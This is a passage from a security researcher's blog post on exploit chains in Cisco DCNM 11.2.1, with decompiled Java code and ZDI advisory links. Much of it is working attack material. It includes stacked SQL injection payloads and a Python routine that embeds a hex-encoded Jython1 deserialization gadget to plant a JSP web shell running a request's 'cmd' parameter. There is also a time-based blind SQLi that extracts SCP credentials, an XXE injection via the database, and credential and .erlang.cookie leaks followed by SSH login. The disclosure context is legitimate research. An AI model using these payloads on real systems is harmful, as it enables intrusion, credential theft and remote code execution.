/*      */   public long retrieveFile(String fileName, File destination, String userName) throws Exception { 
/*      */     return retrieveFile(fileName, destination, userName, "xmlDocs");
/*      */   }
```

Then `PostgresWrapper.retrieveFile` is called with the same arguments as well as the `xmlDocs` string. I had some issues with decompiling this class under eclipse which is why the code is missing line numbers.

```java
/*      */  public long retrieveFile(String fileName, File destination, String userName, String tableName) throws Exception {
/*      */    conn = null;
/*      */    ps = null;
/*      */    rs = null;
/*      */    long checksum = 0L;
/*      */
/*      */    try {
/*      */      String sql = "SELECT content, checksum FROM " + tableName + "  WHERE document_name = ? " + ((userName != null && userName.length() > 0) ? " and user_name = ?" : "");
/*      */      _Logger.debug("retrieveFile() path: " + destination.getPath());
/*      */      _Logger.debug("retrieveFile()  sql: " + sql);
/*      */      conn = ConnectionManager.getConnection();
/*      */      ps = conn.prepareStatement(sql);
/*      */      ps.setString(1, fileName);
/*      */      if (userName != null && userName.length() > 0) ps.setString(2, userName); 
/*      */      rs = ps.executeQuery();
/*      */      while (rs.next()) {
/*      */        byte[] content = rs.getBytes(1);
/*      */        FileOutputStream fos = new FileOutputStream(destination);
/*      */        fos.write(content);
/*      */        fos.close();
```

It can be observed that our controlled `destination` is used as a location for a write via the `FileOutputStream` instance object. The `content` for the write is taken from directly the database without further checks. If we can update the `content` in this table using an SQL injection, then we can essentially write controlled code into an arbitrary file.
[ret2toc](#table-of-contents)

### Primitive 2 - Deserialization of Untrusted Data

Vulnerable Targets:
- Installer for Windows (dcnm-installer-x64-windows.11.2.1.exe.zip)
- ISO Virtual Appliance for VMWare (dcnm-va.11.2.1.iso.zip)

Using an SQL injection, we can inject serialized payloads into the database and later trigger deserialization. Inside of the `com.cisco.dcbu.web.client.rest.health.vpc.VirtualPortChannel` REST class we can see the `getVpcPeerHistoryDetails` method.

```java
/*     */   @GET
/*     */   @Produces({"application/json"})
/*     */   @Path("vpcwizard/history/details")
/*     */   public Response getVpcPeerHistoryDetails(@QueryParam("context") String context, @QueryParam("jobId") String jobId) {
/*     */     try {
/* 486 */       return Response.ok(ConfigHistoryUtil.getJobDetails(context, Long.parseLong(jobId))).build();
/* 487 */     } catch (Exception ex) {
/* 488 */       _Log.error("getVpcPeerHistory", ex);
/*     */       
/* 490 */       return Response.serverError().build();
/*     */     } 
/*     */   }
```

On line *[486]* we can see a call to `ConfigHistoryUtil.getJobDetails`.

```java
/*     */   public static ConfigDeploymentStatus getJobDetails(String context, long jobId) {
/* 221 */     con = null;
/* 222 */     stmt = null;
/* 223 */     rs = null;
/* 224 */     String sql = null;
/*     */     try {
/* 226 */       con = ConnectionManager.getConnection();
/* 227 */       if (context.equals("vpc")) {
/* 228 */         sql = "select commands from VPC_HISTORY where id=?";
/*     */       } else {
/* 230 */         sql = "select commands from vpc_peer_history where id=?";
/*     */       } 
/* 232 */       stmt = PersistentHelper.getHelper().getPreparedStmt(con, sql, 1004, 1007);
/*     */ 
/*     */       
/* 235 */       stmt.setLong(1, jobId);
/* 236 */       rs = SQLLoader.execute(stmt);
/* 237 */       if (rs.next()) {
/* 238 */         InputStream input = rs.getBinaryStream("commands");
/* 239 */         ObjectInputStream ois = new ObjectInputStream(input);
/* 240 */         return (ConfigDeploymentStatus)ois.readObject();
/*     */       } 
/* 242 */     } catch (Exception ex) {
/* 243 */       _Log.error("deleteJob", ex);
/*     */     } finally {
/* 245 */       DbUtil.close(rs);
/* 246 */       DbUtil.close(stmt);
/* 247 */       DbUtil.close(con);
/*     */     } 
/*     */     
/* 250 */     return null;
/*     */   }
```

The code performs a select statement from the database (either from `vpc_history` or `vpc_peer_history` tables) for the `command` column. At line *[238]* the code calls `rs.getBinaryStream` which extracts the binary stream data from the result set of the sql statement. With that input, we can see a classic `readObject` call using that column data.

An example of an SQL injection statement to exploit this issue is presented below. You will need to change the `41` to an ascii hex encoded serialized payload from [ysoserial](https://github.com/frohoff/ysoserial).

```sql
;insert into vpc_peer_history(id, commands) values (2, decode('41', 'hex'));--
;insert into vpc_history(id, commands) values (2, decode('41', 'hex'));--
```

Now when we trigger the following endpoint, we'll deserialize our serialized payload.

```bash
https://<target>/fm/fmrest/virtualportchannel/vpcwizard/history/details?context=vpc&jobId=2
```

Cisco used newer versions of all libs known to contain gadget chains which means that several Java properties need to be set to allow untrusted deserialization of Data. For example, newer versions of the [commons-fileupload](https://issues.apache.org/jira/browse/FILEUPLOAD-279) lib was used so the target would need the `org.apache.commons.fileupload.disk.DiskFileItem.serializable` system property set to `true` to be vulnerable.

It was the same situation for the [common-collections](https://issues.apache.org/jira/browse/COLLECTIONS-580) lib. The `org.apache.commons.collections.enableUnsafeSerialization` system property needed to be set to `true` for us to gain remote code execution.

After a short break, I noticed that the **jython-standalone** lib was present in the class path. The version was **2.7.0** and did not match the version in [ysoserial](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/Jython1.java#L44). As it turns out, I can (ab)use this lib for deserialzation. All I needed to do was change the `pom.xml` file in the ysoserial project to use version **2.7.0** of the jython-standalone lib so that the `serialversionuId` matches that of my target. Now I could use the `Jython1` gadget chain.

```xml
    <dependency>
        <groupId>org.python</groupId>
        <artifactId>jython-standalone</artifactId>
        <version>2.7.0</version>
    </dependency>
```

The Python maintainers never patched this gadget chain, so if it's in your class path an attacker could leverage it for remote (python bytecode) execution. In both of the setups I tested, the python path wasn't set in Java's environment so I could not get jython code executed via the [`execfile`](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/Jython1.java#L77)!

However, I didn't need to because the gadget chain uses python bytecode to [write a file](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/Jython1.java#L67) with our controlled content into an arbitrary location. I could have engineered some python bytecode to directly execute a stub, but this was good enough. Therefore, I just created a backdoor file called `si.jsp` and specified the remote path (web root) to write the file to!

```bash
java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar Jython1 "si.jsp;../../standalone/tmp/vfs/temp/xxxxxxxxxxxxxxxxxxxx/yyyyyyyyyyyyyyyyyyyyyyyy/si.jsp" > poc.bin
```

I used the path `/xxxxxxxxxxxxxxxxxxxx/yyyyyyyyyyyyyyyyyyyyyyyy/` here because the application server Cisco DCNM is using is [Wildfly](https://wildfly.org/) (known previously as Jboss) and it has hot deployment enabled meaning everytime the application server was restarted, the web root changes location. I could have written a war file into the hot deployment directory and have the war deployed on the fly (the hot deployment directory is a fixed path) but I used the web root because I could leak the virtual file path using a different vulnerability and the post exploitation cleanup was easier.

For reference, here is the `we_can_trigger_sqli_for_deserialization` and `we_can_trigger_deserialization` methods I used to exploit this code path for remote code execution.

```py
def we_can_trigger_sqli_for_deserialization(target, filename):
    ser = """aced0005737200176a6176612e7574696c2e5072696f7269747951756575
    6594da30b4fb3f82b103000249000473697a654c000a636f6d7061726174
    6f727400164c6a6176612f7574696c2f436f6d70617261746f723b787000
    000002737d0000000100146a6176612e7574696c2e436f6d70617261746f
    72787200176a6176612e6c616e672e7265666c6563742e50726f7879e127
    da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f726566
    6c6563742f496e766f636174696f6e48616e646c65723b78707372001a6f
    72672e707974686f6e2e636f72652e507946756e6374696f6e3fe65f596b
    67972b0200084c000b5f5f636c6f737572655f5f74001a4c6f72672f7079
    74686f6e2f636f72652f50794f626a6563743b4c00085f5f636f64655f5f
    7400184c6f72672f707974686f6e2f636f72652f5079436f64653b5b000c
    5f5f64656661756c74735f5f74001b5b4c6f72672f707974686f6e2f636f
    72652f50794f626a6563743b4c00085f5f646963745f5f71007e00084c00
    075f5f646f635f5f71007e00084c000b5f5f676c6f62616c735f5f71007e
    00084c000a5f5f6d6f64756c655f5f71007e00084c00085f5f6e616d655f
    5f7400124c6a6176612f6c616e672f537472696e673b787200186f72672e
    707974686f6e2e636f72652e50794f626a656374daaa6a7f5c5d0b7b0200
    024c000a617474726962757465737400124c6a6176612f6c616e672f4f62
    6a6563743b4c00076f626a747970657400184c6f72672f707974686f6e2f
    636f72652f5079547970653b787070737200236f72672e707974686f6e2e
    636f72652e50795479706524547970655265736f6c7665727b8153c59e62
    6af90200034c00066d6f64756c6571007e000b4c00046e616d6571007e00
    0b4c0010756e6465726c79696e675f636c6173737400114c6a6176612f6c
    616e672f436c6173733b787074000b5f5f6275696c74696e5f5f74000866
    756e6374696f6e7671007e0007707372001a6f72672e707974686f6e2e63
    6f72652e507942797465636f6465e63e58b3fab66c3802000849000c636f
    5f737461636b73697a65490005636f756e745a000564656275674900086d
    6178436f756e745b0007636f5f636f64657400025b425b0009636f5f636f
    6e73747371007e000a5b0009636f5f6c6e6f74616271007e00175b000863
    6f5f6e616d65737400135b4c6a6176612f6c616e672f537472696e673b78
    72001a6f72672e707974686f6e2e636f72652e507942617365436f64655e
    76d44441c3947402000c49000b636f5f617267636f756e7449000e636f5f
    66697273746c696e656e6f49000a636f5f6e6c6f63616c7349000c6a795f
    6e7075726563656c6c4900056e617267735a0007766172617267735a0009
    7661726b77617267735b000b636f5f63656c6c7661727371007e00184c00
    0b636f5f66696c656e616d6571007e000b4c0008636f5f666c6167737400
    1f4c6f72672f707974686f6e2f636f72652f436f6d70696c6572466c6167
    733b5b000b636f5f667265657661727371007e00185b000b636f5f766172
    6e616d657371007e0018787200166f72672e707974686f6e2e636f72652e
    5079436f6465745466123782c53b0200014c0007636f5f6e616d6571007e
    000b7871007e000c707371007e001071007e001374000862797465636f64
    657671007e00167400083c6d6f64756c653e000000020000000000000002
    00000000000000020000707400066e6f6e616d657372001d6f72672e7079
    74686f6e2e636f72652e436f6d70696c6572466c6167736cb83b068ebb10
    0f0200055a0011646f6e745f696d706c795f646564656e745a00086f6e6c
    795f6173745a000e736f757263655f69735f757466384c0008656e636f64
    696e6771007e000b4c0005666c61677374000f4c6a6176612f7574696c2f
    5365743b787000000070737200246a6176612e7574696c2e456e756d5365
    742453657269616c697a6174696f6e50726f78790507d3db7654cad10200
    024c000b656c656d656e745479706571007e00115b0008656c656d656e74
    737400115b4c6a6176612f6c616e672f456e756d3b7870767200186f7267
    2e707974686f6e2e636f72652e436f6465466c6167000000000000000012
    00007872000e6a6176612e6c616e672e456e756d00000000000000001200
    007870757200115b4c6a6176612e6c616e672e456e756d3ba88dea2d33d2
    2f980200007870000000037e71007e0028740009434f5f4e45535445447e
    71007e0028740014434f5f47454e455241544f525f414c4c4f5745447e71
    007e0028740018434f5f4655545552455f574954485f53544154454d454e
    5470757200135b4c6a6176612e6c616e672e537472696e673badd256e7e9
    1d7b4702000078700000000274000071007e00350000000a0000000000ff
    ffffff757200025b42acf317f8060854e002000078700000003474000064
    01006402008302007d00007c0000690100640300830100017c0000690200
    8300000174030064010083010001640000537572001b5b4c6f72672e7079
    74686f6e2e636f72652e50794f626a6563743b250440d51bd0043f020000
    787000000004737200186f72672e707974686f6e2e636f72652e50795374
    72696e67ec9aabdcc5c7853d0200024c00066578706f72747400194c6a61
    76612f6c616e672f7265662f5265666572656e63653b4c0006737472696e
    6771007e000b7872001c6f72672e707974686f6e2e636f72652e50794261
    7365537472696e67251751e8b3092f9c0200007872001a6f72672e707974
    686f6e2e636f72652e507953657175656e6365555a4f144e433ee1020001
    4c000964656c656761746f727400274c6f72672f707974686f6e2f636f72
    652f53657175656e6365496e64657844656c65676174653b7871007e000c
    707371007e001071007e00137400037374727671007e003a7372002f6f72
    672e707974686f6e2e636f72652e507953657175656e6365244465666175
    6c74496e64657844656c65676174656dea572b0a72a6800200014c000674
    686973243074001c4c6f72672f707974686f6e2f636f72652f5079536571
    75656e63653b787200256f72672e707974686f6e2e636f72652e53657175
    656e6365496e64657844656c6567617465bdf7d08974dabf8e0200007870
    71007e003f7071007e00357371007e003a7071007e00407371007e004371
    007e0047707400552e2e2f2e2e2f7374616e64616c6f6e652f746d702f76
    66732f74656d702f78787878787878787878787878787878787878782f79
    79797979797979797979797979797979797979797979792f%s2e
    6a73707371007e003a7071007e00407371007e004371007e004a70740002
    772b7371007e003a7071007e00407371007e004371007e004d7074003e3c
    252052756e74696d652e67657452756e74696d6528292e65786563287265
    71756573742e676574506172616d657465722822636d642229293b20253e
    0a7571007e0036000000007571007e0033000000047400046f70656e7400
    057772697465740005636c6f73657400086578656366696c657070737200
    246f72672e707974686f6e2e636f72652e50792453696e676c65746f6e52
    65736f6c7665720545e0d125fd2ebc0200014c0005776869636871007e00
    0b78707400044e6f6e657372001b6f72672e707974686f6e2e636f72652e
    5079537472696e674d61706757d173fb578b160200014c00057461626c65
    7400244c6a6176612f7574696c2f636f6e63757272656e742f436f6e6375
    7272656e744d61703b7871007e000c707371007e001071007e0013740009
    737472696e676d61707671007e0059737200266a6176612e7574696c2e63
    6f6e63757272656e742e436f6e63757272656e74486173684d61706499de
    129d87293d03000349000b7365676d656e744d61736b49000c7365676d65
    6e7453686966745b00087365676d656e74737400315b4c6a6176612f7574
    696c2f636f6e63757272656e742f436f6e63757272656e74486173684d61
    70245365676d656e743b78700000000f0000001c757200315b4c6a617661
    2e7574696c2e636f6e63757272656e742e436f6e63757272656e74486173
    684d6170245365676d656e743b52773f41329b3974020000787000000010
    7372002e6a6176612e7574696c2e636f6e63757272656e742e436f6e6375
    7272656e74486173684d6170245365676d656e741f364c905893293d0200
    0146000a6c6f6164466163746f72787200286a6176612e7574696c2e636f
    6e63757272656e742e6c6f636b732e5265656e7472616e744c6f636b6655
    a82c2cc86aeb0200014c000473796e6374002f4c6a6176612f7574696c2f
    636f6e63757272656e742f6c6f636b732f5265656e7472616e744c6f636b
    2453796e633b7870737200346a6176612e7574696c2e636f6e6375727265
    6e742e6c6f636b732e5265656e7472616e744c6f636b244e6f6e66616972
    53796e63658832e7537bbf0b0200007872002d6a6176612e7574696c2e63
    6f6e63757272656e742e6c6f636b732e5265656e7472616e744c6f636b24
    53796e63b81ea294aa445a7c020000787200356a6176612e7574696c2e63
    6f6e63757272656e742e6c6f636b732e4162737472616374517565756564
    53796e6368726f6e697a65726655a843753f52e302000149000573746174
    65787200366a6176612e7574696c2e636f6e63757272656e742e6c6f636b
    732e41627374726163744f776e61626c6553796e6368726f6e697a657233
    dfafb9ad6d6fa90200007870000000003f4000007371007e00647371007e
    0068000000003f4000007371007e00647371007e0068000000003f400000
    7371007e00647371007e0068000000003f4000007371007e00647371007e
    0068000000003f4000007371007e00647371007e0068000000003f400000
    7371007e00647371007e0068000000003f4000007371007e00647371007e
    0068000000003f4000007371007e00647371007e0068000000003f400000
    7371007e00647371007e0068000000003f4000007371007e00647371007e
    0068000000003f4000007371007e00647371007e0068000000003f400000
    7371007e00647371007e0068000000003f4000007371007e00647371007e
    0068000000003f4000007371007e00647371007e0068000000003f400000
    7371007e00647371007e0068000000003f40000070707871007e00577100
    7e0020770400000003737200116a6176612e6c616e672e496e7465676572
    12e2a0a4f781873802000149000576616c7565787200106a6176612e6c61
    6e672e4e756d62657286ac951d0b94e08b02000078700000000171007e00
    8d78""" % filename.encode("hex")

    d = ''.join(ser.split()).decode("hex")

    # patch the length if its shorter
    vfs_path = str(vfs)
    while (len(vfs_path) != 45):
        vfs_path += "/"

    d = d.replace('xxxxxxxxxxxxxxxxxxxx/yyyyyyyyyyyyyyyyyyyyyyyy', vfs_path)
    d = d.encode("hex")

    sql = "delete from vpc_peer_history where id=1337;"
    sql += "insert into vpc_peer_history(id, commands) values (1337, decode('%s', 'hex'));" % d
    if we_can_trigger_sqli(target, sql):
        return True
    return False

def we_can_trigger_deserialization(target):
    uri = "https://%s/fm/fmrest/virtualportchannel/vpcwizard/history/details" % target
    p = {"context": 1337, "jobId": 1337}
    c = { "resttoken" : resttoken }
    r = requests.get(uri, cookies=c, params=p, verify=False, allow_redirects=False)
    if r.status_code == 200:
        return True
    return False
```

A huge thanks goes to [Alvaro Munoz](https://twitter.com/pwntester) and [Christian Schneider](https://twitter.com/cschneider4711) for this gadget chain, nice work!

[ret2toc](#table-of-contents)

### Primitive 3 - SCP Credential Leak

Vulnerable Targets:
- ISO Virtual Appliance for VMWare (dcnm-va.11.2.1.iso.zip)

Some of the SQL injection vulnerabilities didn't allow me to stack the queries. The code would sometimes split the injected string on the `;` character. Since I could only leak information from the database with them, I developed a statement that allowed me to leak the SCP username and plain-text password out of the `image_and_config_server` table.

```sql
and 'a'=(select case when substr(concat(username,'|',password), %d, 1)='%s' then pg_sleep(%d)||'a' else null end from image_and_config_server where name='Default_SCP_Repository')--
```

Once this was done, I could just login via SSH.

![Leaking SCP credentials and logging in to the system via SSH](/assets/images/busting-ciscos-beans/sqli-id.png "Leaking SCP credentials and logging in to the system via SSH")

[ret2toc](#table-of-contents)

## SQLi2FD Primitive

This is the file disclosure primitive I used to chain with arbitrary sql execution vulnerabilities. This primitive take advantage of the assumed trust that the application code had with the database.

In this case, there was no second order attack - meaning that the insertion stage of data injection was filtered for malicious input enough to prevent direct file disclosure. This is why it was not considered a vulnerability itself.

### External Entity Injection (XXE)

Vulnerable Targets:
- Installer for Windows (dcnm-installer-x64-windows.11.2.1.exe.zip)
- ISO Virtual Appliance for VMWare (dcnm-va.11.2.1.iso.zip)

In the `com.cisco.dcbu.vinci.rest.services.CablePlans` class, we can see the REST method `getCablePlan`.

```java
/*      */ @Path("/cable-plans/")
/*      */ public class CablePlans

...

/*      */   @GET
/*      */   @Produces({"application/json"})
/*      */   @Mapped
/*      */   public Response getCablePlan(@QueryParam("detail") boolean detail) {
/*      */     try {
/*  213 */       System.out.println("[DEBUG DETAIL Value:: ]::  " + detail);
/*  214 */       if (detail) {
/*      */         
/*  216 */         List<CablePlan> cablePlanList = viewCablePlanContent(detail);
```

At line *[216]* we can see a call to `CablePlans.viewCablePlanContent` method.

```java
/*      */   public List<CablePlan> viewCablePlanContent(boolean detail) throws SQLException, ClassNotFoundException, Exception {
/*  256 */     List<CablePlan> cableplanList = new ArrayList<CablePlan>();
/*  257 */     conn = null;
/*  258 */     stmt = null;
/*  259 */     rs = null;
/*      */     
/*      */     try {
/*  262 */       String content = "";
/*  263 */       String sql = "SELECT ID, GENERATE_FROM, FILENAME, CONTENT from cableplanglobal";
/*  264 */       conn = ConnectionManager.getConnection();
/*  265 */       stmt = conn.createStatement();
/*  266 */       rs = stmt.executeQuery(sql);
/*      */       
/*  268 */       while (rs.next()) {
/*  269 */         content = rs.getString(4);
/*      */       }
/*      */       
/*  272 */       if (!RestHelper.isEmpty(content))
/*      */       {
/*  274 */         ParseXMLFile parsexmlfile = new ParseXMLFile();
/*  275 */         cableplanList = parsexmlfile.ReadXMLFile(content);
/*      */       }
/*      */     
/*  278 */     }
```

At line *[275]* the code calls `ParseXMLFile.ReadXMLFile` with our injected XML file from the `cableplanglobal` table.

```java
/*     */ public class ParseXMLFile
/*     */   extends DefaultHandler
/*     */ {
/*  24 */   List cableList = new ArrayList();
/*  25 */   String sourceSwitch = "";
/*  26 */   String type = "";
/*  27 */   String sourcePort = "";
/*  28 */   String destSwitch = "";
/*     */   
/*  30 */   String destPort = "";
/*     */   
/*     */   boolean chassisInfo = false;
/*     */   boolean linkInfo = false;
/*  34 */   CablePlan cableplan = new CablePlan();
/*     */ 
/*     */ 
/*     */   
/*     */   public List<CablePlan> ReadXMLFile(String fileContent) {
/*  39 */     SAXParserFactory factory = SAXParserFactory.newInstance();
/*  40 */     File file = (new CablePlans()).writeStringToFile(fileContent);
/*     */     try {
/*  42 */       SAXParser parser = factory.newSAXParser();
/*  43 */       parser.parse(file, this);
```

Without reviewing what `CablePlans.writeStringToFile` does, we can see that at line *[43]* the code eventually calls `SAXParser.parse` using a `File` instance pointing to our controlled XML content.

The injection would be as simple as: `;insert into cableplanglobal(id, content) values (1337, '<XXE payload>');`. Now that we can leak files, we could have then used that to [achieve further damage](#fd2rce-primitives).
[ret2toc](#table-of-contents)

## FD2RCE Primitives

These are the primitives I used to exploit vulnerabilities that allowed me to disclose arbitrary files either with or without a directory traversal.

### Primitive 1 - RabbitMQ .erlang.cookie Leak

Vulnerable Targets:
- ISO Virtual Appliance for VMWare (dcnm-va.11.2.1.iso.zip)

The erlang portmapper daemon is running by default on the appliance and is exposed remotely. It can be (ab)used for remote code execution if we can leak the `.erlang.cookie` file.

```bash
[root@localhost ~]# cat /var/lib/rabbitmq/.erlang.cookie
QDBQPTVNAMZZURTUNHNC[root@localhost ~]#
```

![Gaining RCE as rabbitmq via file disclosure](/assets/images/busting-ciscos-beans/erlang-cookie.png "Gaining RCE as rabbitmq via file disclosure")

[ret2toc](#table-of-contents)

### Primitive 2 - SCP Credential Leak

Vulnerable Targets:
- ISO Virtual Appliance for VMWare (dcnm-va.11.2.1.iso.zip)

We already know that the `image_and_config_server` table contains the SCP credentials. So we can find the Postgres filesystem mapping for it. To do that, we leak the `oid` and `relfilenode` from the dcmdb database.

```bash
dcmdb=# select oid from pg_database where datname='dcmdb';
  oid  
-------
 16393
(1 row)

dcmdb=# select relfilenode from pg_class where relname='image_and_config_server';
 relfilenode 
-------------
       17925
(1 row)
```

The correct path to the `image_and_config_server` table is `/usr/local/cisco/dcm/db/data/base/16393/17925`. This path is fixed between deployments so leaking this database information from the db is not a pre-requisite for this vector.

```bash
[root@localhost ~]# hexdump -C /usr/local/cisco/dcm/db/data/base/16393/17925
00000000  00 00 00 00 a0 b7 cf 01  00 00 00 00 1c 00 68 1f  |..............h.|
00000010  00 20 04 20 00 00 00 00  68 9f 30 01 00 00 00 00  |. . ....h.0.....|
00000020  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
00001f60  00 00 00 00 00 00 00 00  53 0a 00 00 00 00 00 00  |........S.......|
00001f70  00 00 00 00 00 00 00 00  01 00 09 00 02 09 18 00  |................|
00001f80  01 00 00 00 00 00 00 00  2f 44 65 66 61 75 6c 74  |......../Default|
00001f90  5f 53 43 50 5f 52 65 70  6f 73 69 74 6f 72 79 47  |_SCP_RepositoryG|
00001fa0  73 63 70 3a 2f 2f 31 39  32 2e 31 36 38 2e 31 30  |scp://192.168.10|
00001fb0  30 2e 31 30 31 2f 76 61  72 2f 6c 69 62 2f 64 63  |0.101/var/lib/dc|
00001fc0  6e 6d 0b 70 6f 61 70 13  37 65 35 62 66 34 32 39  |nm.poap.7e5bf429|   <== user/password is on this line
00001fd0  21 31 39 32 2e 31 36 38  2e 31 30 30 2e 31 30 31  |!192.168.100.101|
00001fe0  09 73 63 70 1d 2f 76 61  72 2f 6c 69 62 2f 64 63  |.scp./var/lib/dc|
00001ff0  6e 6d 00 00 00 00 00 00  57 30 8f 8b 82 32 02 00  |nm......W0...2..|
00002000
```

Assuming that our file disclosure vulnerabilities can read binary files as root (hint: they can) then we can pull the plain-text system password out for the poap user.

You could just leak the `/etc/shadow` file and crack the root or poap user passwords. The root password is set by the administrator during installation so it maybe tricky/annoying to crack. However, **the poap users password is set by the installer and only 7 characters in length using the [a-z0-9] character set!**

```
saturn:~ mr_me$ sshpass -p '7e5bf429' ssh poap@192.168.100.123 'id;uname -a'
uid=1000(poap) gid=1000(poap) groups=1000(poap)
Linux localhost 3.10.0-957.10.1.el7.x86_64 #1 SMP Mon Mar 18 15:06:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```

[ret2toc](#table-of-contents)

### Primitive 3 - Leaking server.properties

Vulnerable Targets:
- ISO Virtual Appliance for VMWare (dcnm-va.11.2.1.iso.zip)

If you prefer root access (like I do) then you can also leak the `server.properties` file. This is the same file that's displayed in the web interface for [ZDI-20-012](https://www.zerodayinitiative.com/advisories/ZDI-20-012/) in [RCE Chain 2](#rce-chain-2).

```bash
[root@localhost ~]# cat /usr/local/cisco/dcm/fm/conf/server.properties | grep sftp
server.sftp.rootdir=/
server.sftp.username=root
server.sftp.password=#59f44e08047be2d72f34371127b18a0b
server.sftp.enabled=true
```

We can proceed to decrypt the password just like we did in [ZDI-20-013](https://www.zerodayinitiative.com/advisories/ZDI-20-013/) and then login in via SSH.
[ret2toc](#table-of-contents)

## Conclusions

I have none. This blog post is long enough.

## References

- [https://raw.githubusercontent.com/pedrib/PoC/master/advisories/cisco-ucs-rce.txt](https://raw.githubusercontent.com/pedrib/PoC/master/advisories/cisco-ucs-rce.txt)
- [https://github.com/frohoff/ysoserial](https://github.com/frohoff/ysoserial)
- [http://blog.bdoughan.com/2011/06/using-jaxbs-xmlaccessortype-to.html](http://blog.bdoughan.com/2011/06/using-jaxbs-xmlaccessortype-to.html)
- [https://zhangyuhui.blog/2018/01/12/leak-issue-of-inheritablethreadlocal-and-how-to-fix-it/](https://zhangyuhui.blog/2018/01/12/leak-issue-of-inheritablethreadlocal-and-how-to-fix-it/)